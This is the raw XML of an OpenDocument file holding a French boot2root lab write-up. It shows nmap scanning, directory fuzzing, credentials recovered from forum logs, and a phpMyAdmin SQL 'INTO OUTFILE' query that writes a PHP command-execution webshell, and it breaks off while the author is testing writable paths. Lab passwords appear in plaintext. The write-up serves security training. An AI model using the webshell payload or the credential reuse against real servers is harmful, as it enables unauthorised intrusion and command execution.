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6600000669B0DB1B8E.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003C0D000012D0CE699968.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000059EC000010DA3D7EF46E.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000024620000064FA171D656.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000019F20000205A90ECC869.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004E09000016890BD9B598.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000455B000031D2C07E996D.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000521100000E94399EF145.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000343200001AE069C7935A.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000473700001DFAD7C2F7C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Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm"/>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#ffffff"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#ffffff" style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#ffffff" style:font-name="Courier New" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#ffffff"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#ffffff" style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#ffffff" style:font-name="Courier New" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#008800" style:font-name="Courier New" fo:font-style="italic" fo:background-color="#0f140f"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#008800" style:font-name="Courier New" fo:font-size="10pt" fo:font-style="italic" fo:background-color="#0f140f" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#ff0007" fo:font-style="italic" fo:font-weight="bold" fo:background-color="#0f140f"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L1">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>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style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties style:font-name="Times New Roman" style:text-underline-style="none"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Courier New" fo:font-size="11pt" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="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normal" fo:font-weight="normal" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="10pt" fo:font-weight="normal" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="10pt" style:text-underline-style="none" fo:font-weight="normal" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="10.5pt" fo:font-weight="normal" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties fo:color="#cdcaa9" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties fo:color="#cdcaa9" style:font-name="Courier New" fo:font-style="normal" fo:font-weight="bold" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties fo:color="#cdcaa9" style:font-name="Courier New" fo:font-weight="bold" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:color="#cdcaa9" style:font-name="Courier New" fo:font-size="10pt" fo:font-weight="bold" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties fo:color="#ffffff"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties fo:color="#ffffff" style:font-name="Courier New" fo:font-style="normal" fo:font-weight="normal" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties fo:color="#ffffff" style:font-name="Courier New" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties fo:color="#ffffff" style:font-name="Courier New" fo:font-size="10pt" fo:font-weight="normal" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties fo:color="#ffffff" style:font-name="Courier New" fo:font-size="10pt" style:text-underline-style="none" fo:font-weight="normal" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties fo:color="#0086f7" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties fo:color="#ff0086" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties fo:color="#ff0086" style:font-name="Courier New" fo:font-style="normal" fo:font-weight="bold" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties fo:color="#ff0086" style:font-name="Courier New" fo:font-weight="bold" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties fo:color="#ff0086" style:font-name="Courier New" fo:font-size="10pt" fo:font-weight="bold" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T33" style:family="text">
      <style:text-properties fo:color="#fb660a" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties fo:color="#fb660a" style:font-name="Courier New" fo:font-weight="bold" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties fo:color="#fb660a" style:font-name="Courier New" fo:font-size="10pt" style:text-underline-style="none" fo:font-weight="bold" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties fo:color="#0086d2"/>
    </style:style>
    <style:style style:name="T37" style:family="text">
      <style:text-properties fo:color="#008800" fo:font-style="italic" fo:background-color="#0f14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TF PATH</text:p>
      <text:p text:style-name="P4">Boot2root writeups</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P2">&gt;&gt;&gt; INITIAL ENUMERATION</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P1"><text:span text:style-name="T1">La première étape est bien sûr de récupérer l'adresse IP de la machine cible, puisque celle-ci n'est pas affichée sur la VM Boot2root. Un simple scan </text:span>NMAP <text:span text:style-name="T1">des hôtes actifs sur notre réseau local suffit :</text:span></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P6">nmap -sn 192.168.1.0/24</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">L'adresse IP de la machine est 192.168.1.7. On trouve plusieurs ports d'ouverts :</text:p>
      <text:list xml:id="list4498483608331082009" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P28">21 FTP.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">22 SSH.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">80 HTTP.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">143 IMAP.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">443 HTTPS.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">993 IMAPS.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">IMAP et IMAPS sont des protocoles permettant à des utilisateurs d'accéder à leurs mails (sans devoir les télécharger sur leur ordinateur) :</text:p>
      <text:p text:style-name="P1"><text:a xlink:type="simple" xlink:href="https://vk9-sec.com/25110143-tcp-smtppop3imap-enumeration/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T1">https://vk9-sec.com/25110143-tcp-smtppop3imap-enumeration/</text:span></text:a><text:span text:style-name="T1"> </text:span></text:p>
      <text:p text:style-name="P1"><text:a xlink:type="simple" xlink:href="https://www.hostinger.fr/tutoriels/mail-pop3-smtp-imap" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T1">https://www.hostinger.fr/tutoriels/mail-pop3-smtp-imap</text:span></text:a><text:span text:style-name="T1"> </text:span></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P3"><text:span text:style-name="T1">On commence par l'énumération du serveur </text:span><text:span text:style-name="T2">ftp</text:span><text:span text:style-name="T1">, et on tente un </text:span><text:span text:style-name="T2">login anonyme</text:span><text:span text:style-name="T1"> sur le port 21 (sait-on jamais </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">¯\(°_o)/¯ </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">). On récupère un message d'erreur </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">vsftpd: refusing to run with writable root inside chroot()</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> ; pas d'accès anonyme possible.</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Sur le port 80, une simple page d'accueil nous informant que le site est en développement. Sur le port 443, une page 404 Not Found.</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">fuzz </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">un peu ces deux ports. On trouve sur les deux un path </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">/forum</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">, auquel on ne peut accéder que via https, port 443 (sur le 80 on a Access Denied). On trouve un peu moins de path sur le port 80, mais les suivants sur le port 443 :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">cgi-bin/ <text:s text:c="15"/>[Status: 403, Size: 288, Words: 21, Lines: 11]</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">forum <text:s text:c="18"/>[Status: 301, Size: 312, Words: 20, Lines: 10]</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">phpmyadmin <text:s text:c="13"/>[Status: 301, Size: 317, Words: 20, Lines: 10]</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">server-status <text:s text:c="10"/>[Status: 403, Size: 293, Words: 21, Lines: 11]</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">webmail <text:s text:c="16"/>[Status: 301, Size: 314, Words: 20, Lines: 10]</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Phpmyadmin, comme prévu, est la page de login phpmyadmin ; webmail nous dirige vers une page de login de boîte mail (la raison donc des ports IMAP et IMAPS), mais on ne dispose pas de credentials pour se connecter. On va donc faire un tour sur </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">forum</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T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gt;&gt;&gt; FORUM SCRAPING</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On trouve comme prévu un forum, avec plusieurs questions. L'une d'entre elles attire notre attention, "Problem login". On voit que dans le post de forum, des logs de connection ont été postés.</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Parmi ces logs, on trouve ce passage intéressant :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images1" text:anchor-type="paragraph" svg:width="18.999cm" svg:height="3.374cm" draw:z-index="0"><draw:image xlink:href="Pictures/200000070000521100000E94399EF145.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Il semble qu'un utilisateur ait entré son mot de passe à la place de son username (premier encadré rouge, ressemble beaucoup à un mot de passe), avant d'entrer de bons credentials. On peut donc supposer que ces credentials pourraient être valides :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">lmezard:!q\]Ej?*5K5cy*AJ</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On essaie de se connecter via ssh ; sur phpmyadmin ; sur webmail, mais cela ne fonctionne pas. Les credentials fonctionnent cependant pour le login du forum lui-même, afin d'accéder au compte de l'utilisateur </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">lmezard</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">. Une fois connecté, on va voir les paramètres du compte de l'utilisateur, et on récupère une adresse mail :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">laurie@borntosec.net</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11">&gt;&gt;&gt; WEBMAIL SCRAPING</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On utilise cette adresse email pour se connecter au </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">webmail</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">, avec le mot de passe de ci-dessus. On examine les mails présents dans l'inbox de l'utilisateur. On trouve dans un des mails des credentials de la base de données, qui fonctionnent bien pour se connecter à </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">phpmyadmin</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">root<text:tab/>Fg-'kKXBj87E:aJ$</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11">&gt;&gt;&gt; DROPPING A WEBSHELL FROM PHPMYADMIN</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Depuis </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">phpmyadmin</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">, la façon la plus sûre d'aboutir à une exécution de commande consiste à upload une </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">webshell php </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">quelque part dans le serveur web, puis d'y accéder via notre browser par </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">exemple :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="https://www.netspi.com/blog/technical/network-penetration-testing/linux-hacking-case-studies-part-3-phpmyadmin/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">https://www.netspi.com/blog/technical/network-penetration-testing/linux-hacking-case-studies-part-3-phpmyadmin/</text:span></text:span></text:a><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> </text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Typiquement, lorsqu'on clique sur l'onglet </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">SQL </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">de l'interface phpmyadmin, on peut faire tourner des requêtes SQL. Si nous avons les privilèges FILE avec notre utilisateur actuel, on peut alors effectuer une requête SQL de ce style :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">SELECT "hello"</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">INTO OUTILE "/tmp/test"</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Afin d'écrire dans le fichier </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">/tmp/test</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> la string "hello". Il faut simplement, pour cela :</text:span></text:span></text:p>
      <text:list xml:id="list3122895281060203265" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P29"><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Que l'utilisateur actuel ait le privilège d'administration </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">FILE</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">.</text:span></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P29"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Que le chemin d'accès existe (s'il n'existe pas, </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">Err 2</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">).</text:span></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P29"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Que le fichier dans lequel on veut écrire n'existe pas déjà.</text:span></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P29"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Qu'on ait les droits pour écrire au chemin précisé (si pas les droits, </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">Err 13</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">).</text:span></text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Pour vérifier les privilèges, simplement aller dans l'onglet </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">Privilèges</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> et regarder pour l'utilisateur avec lequel on s'est connecté :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images2" text:anchor-type="paragraph" svg:width="12.054cm" svg:height="8.659cm" draw:z-index="1"><draw:image xlink:href="Pictures/200000070000455B000031D2C07E996D.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Pour drop une webshell, dans l'article l'auteur utilise ce snippet SQL :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T14">SELECT "&lt;HTML&gt;&lt;BODY&gt;&lt;FORM METHOD="GET" NAME="myform" ACTION=""&gt;&lt;INPUT TYPE="text" NAME="cmd"&gt;&lt;INPUT TYPE="submit" VALUE="Send"&gt;&lt;/FORM&gt;&lt;pre&gt;&lt;?php if($_GET['cmd']) {system($_GET['cmd']);} ?&gt; &lt;/pre&gt;&lt;/BODY&gt;&lt;/HTML&gt;"</text:span></text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P11">INTO OUTFILE '/var/www/phpMyAdmin/cmd.php'</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Cependant de notre côté on rencontre une </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">Err 2</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">, ce qui signifie que phpmyadmin se situe à un autre path / root. L'installation classique de phpmyadmin est dans </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">/usr/share/phpmyadmin</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">, mais on n'a pas les droits pour écrire dans ce dossier.</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On essaie quelques dossiers du serveur web. On confirme notamment la présence de </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">/var/www/forum</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> car lorsqu'on essaie d'écrire dans un fichier à ce path, on a une </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">Err 13</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> et non une </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Err 2.</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
